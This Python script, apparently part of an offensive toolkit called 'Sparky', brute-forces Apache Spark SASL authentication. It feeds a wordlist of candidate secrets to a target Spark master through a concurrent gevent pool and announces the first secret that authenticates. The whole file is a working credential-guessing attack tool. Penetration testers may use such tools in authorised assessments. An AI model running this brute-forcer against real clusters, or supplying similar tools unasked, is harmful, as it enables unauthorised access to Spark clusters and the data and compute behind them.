#! /usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import unicode_literals, absolute_import, division, print_function

import gevent.monkey

gevent.monkey.patch_all()
from gevent.event import Event

import os, sys, signal, re, time
import gevent.pool
from utils.sparkClient import SparkClient
from utils.general import (
    confirmSpark,
    parseListNodes,
    removeSpaces,
    checkRestPort,
    checkHTTPPort,
    whine,
    isValidFile,
    request_stop,
)
import argparse
from utils.auth import isSecretSaslValid
from utils.logo import logoBrute


def checkResult(validSecret):
    if validSecret:
        whine("Sucessfull authentication on Spark master: %s " % validSecret, "good")
        sys.exit(0)


def startBruteforce(sClient, pool, wordlist):
    for word in open(wordlist, "r"):
        pool.apply_async(
            isSecretSaslValid,
            args=(sClient, word.strip(), "sparkSaslUser", True),
            callback=checkResult,
        )

    pool.join()
    pool.kill()


def main(results):
    hostPort = results.spark_master.split(":")
    target = hostPort[0]
    port = 7077
    if len(hostPort) > 1:
        port = int(hostPort[1])
    wordlist = results.wordlist
    sClient = SparkClient(target, port, "0.0.0.0", "", "")
    pool = gevent.pool.Pool(results.threads)

    if not os.path.exists(wordlist):
        whine("Could not open wordlist file %s " % results.wordlist, "err")
        sys.exit(-1)

    whine("Starting bruteforce...", "info")
    startBruteforce(sClient, pool, wordlist)


class MyParser(argparse.ArgumentParser):
    def error(self, message):
        logoBrute()
        self.print_help()
        sys.exit(2)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, request_stop)
    signal.signal(signal.SIGTERM, request_stop)
    parser = MyParser(
        description="Sparky Brute: a tool to brute force Spark SASL authentication"
    )
    parser.add_argument(
        "spark_master",
        help="The master node of a Spark cluster host:port. If no port is provided, default to 7077",
    )
    parser.add_argument("wordlist", help="Path to a Wordlist")

    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        help="Number of threads to parallelize the bruteforce. Default: 20",
        default=20,
        dest="threads",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        help="Hide the cool ascii art",
        action="store_true",
        default=False,
        dest="quietMode",
    )

    results = parser.parse_args()
    if not results.quietMode:
        logoBrute()

    main(results)
